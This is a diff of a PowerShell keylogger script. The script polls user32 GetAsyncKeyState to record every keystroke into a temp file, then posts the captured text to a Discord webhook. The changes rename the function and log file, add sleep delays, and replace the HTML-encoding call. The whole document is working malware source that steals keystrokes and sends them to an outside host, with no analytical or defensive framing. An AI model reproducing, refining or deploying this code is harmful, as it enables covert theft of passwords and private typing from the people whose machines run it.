@@ -20,10 +20,11 @@ $whuri = "DISCORD_WEBHOOK_HERE"
 
 #==================================================================
 
+Start-Sleep 5
 $ttrun = 1
 $tstrt = Get-Date
 $tend = $tstrt.addminutes($RunTimeP)
-function Start-Main($Path = "$env:temp\charlog.txt") {$sigs = @'
+function Start-Logs($Path = "$env:temp\chars.txt") {$sigs = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
@@ -37,6 +38,7 @@ $API = Add-Type -MemberDefinition $sigs -Name 'Win32' -Namespace API -PassThru
 $null = New-Item -Path $Path -ItemType File -Force
 #==================================================================
 try{
+    Start-Sleep 1
     $run = 0
 	while ($ttrun  -ge $run) {                              
 	while ($tend -ge $tnow) {
@@ -52,7 +54,7 @@ try{
         $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
             if ($success) {[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)}}}$tnow = Get-Date}
         $msg = Get-Content -Path $Path -Raw 
-        $escmsg = [System.Web.HttpUtility]::HtmlEncode($msg)
+        $escmsg = $msg -replace '[&<>]', { $args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;') }
         $json = @{content = $escmsg} | ConvertTo-Json
         Start-Sleep 1
         Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $json
@@ -63,6 +65,7 @@ try{
         }
 finally{}
 }
-Start-Main
+Start-Logs
 }While ($a -le 5)
+
 
